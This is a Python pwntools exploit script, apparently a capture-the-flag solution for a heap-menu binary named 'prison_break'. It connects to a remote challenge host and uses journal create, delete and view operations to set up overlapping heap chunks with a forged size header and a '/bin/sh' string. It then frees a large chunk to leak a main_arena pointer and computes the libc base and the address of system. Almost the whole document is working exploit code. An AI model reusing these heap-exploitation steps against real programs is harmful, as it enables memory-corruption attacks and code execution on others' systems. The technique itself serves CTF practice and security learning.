from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./prison_break")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.62.141", 58104)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)
        
def create(index, size, data):
    io.sendlineafter("# ", b"1")
    io.sendlineafter("Journal index:\n", str(index).encode())
    io.sendlineafter("Journal size:\n", str(size).encode())
    io.sendafter("Enter your data:\n", data)
    return index

def delete(index):
    io.sendlineafter("# ", b"2")
    io.sendlineafter("Journal index:\n", str(index).encode())

def view(index):
    io.sendlineafter("# ", b"3")
    io.sendlineafter("Journal index:\n", str(index).encode())
    io.recvuntil("entry:")

    return io.recv().replace(b"[ \x1b[1;31m P", b"")

def copy(index_origin, index_destination):
    io.sendlineafter("# ", b"4")
    io.sendlineafter("Copy index:\n", str(index_origin).encode())
    io.sendlineafter("Paste index:\n", str(index_destination).encode())

context.terminal = ['gnome-terminal', '-e']
io = start()

a = create(0, 0x18, "A"*0x18)
b = create(1, 0x428, "B"*0x18)
c = create(2, 0x18, "C"*0x18)
y = create(3, 0x18, "Y"*0x18)
d = create(4, 0x18, "D"*0x18)
e = create(5, 0x428, "E"*0x8)

f = create(6, 0x18, p64(0)*2+p64(0x490)+p8(0x30))

guard = create(7, 0x18, b"/bin/sh\x00")

delete(b)

create(b, 0x30, "\n")

leak_main_arena = int(hex(u64(view(b).strip().ljust(8, b"\x00"))) + "40", 16)

print(f"Leak: {hex(leak_main_arena)}")

libc.address = leak_main_arena - libc.sym.main_arena 

print(f"System: {hex(libc.sym.system)}")


io.interactive()